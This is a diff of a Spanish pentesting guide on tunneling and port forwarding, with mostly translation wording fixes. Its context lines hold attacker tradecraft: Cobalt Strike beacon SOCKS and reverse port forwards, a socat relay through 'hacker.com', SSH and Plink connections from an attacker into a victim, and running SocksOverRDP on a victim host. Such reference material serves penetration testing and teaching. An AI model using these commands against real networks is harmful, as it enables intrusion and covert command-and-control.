@@ -5,7 +5,7 @@
 ## Consejo de Nmap
 
 > [!WARNING]
-> **ICMP** y **SYN** los escaneos no se pueden tunelizar a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
+> **ICMP** y **SYN** scans no pueden ser tunelizados a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **scans TCP** (`-sT`) para que esto funcione.
 
 ## **Bash**
 
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Abre un puerto en el teamserver escuchando en todas las interfaces que se puede usar para **rutar el tráfico a través del beacon**.
+Abre un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -145,21 +145,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y desde allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel de tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+- La reversa de puerto de Beacon está diseñada para **túnel de tráfico al Servidor de Equipo, no para retransmitir entre máquinas individuales**.
 - El tráfico está **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
 
 ### rPort2Port local
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor del Equipo) y desde allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -195,7 +195,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Usa la misma versión para el agente y el proxy**
+**Utiliza la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -290,11 +290,9 @@ Puedes eludir un **proxy no autenticado** ejecutando esta línea en lugar de la 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+### SSL Socat Tunnel
 
-### Túnel SSL Socat
-
-**/bin/sh consola**
+**/bin/sh console**
 
 Cree certificados en ambos lados: Cliente y Servidor
 ```bash
@@ -320,7 +318,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
 Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
@@ -346,7 +344,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Necesitas tener **acceso RDP sobre el sistema**.\
 Descargar:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túneles de paquetes sobre la conexión RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnelizar paquetes sobre la conexión RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -354,9 +352,9 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **conectar** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y que **escuchará** en **127.0.0.1:1080**.
+Ahora podemos **conectar** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
 
-**Conéctese** a través de **RDP** y suba y ejecute en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
+**Conéctate** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -480,7 +478,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
-_&#x45;xposition URI son como:_ **UID.ngrok.io**
+_URI de exposición son como:_ **UID.ngrok.io**
 
 ### Instalación
 
@@ -513,7 +511,7 @@ _También es posible agregar autenticación y TLS, si es necesario._
 ```
 #### Sniffing HTTP calls
 
-_Util útil para XSS, SSRF, SSTI ..._\
+_Uso útil para XSS, SSRF, SSTI ..._\
 Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
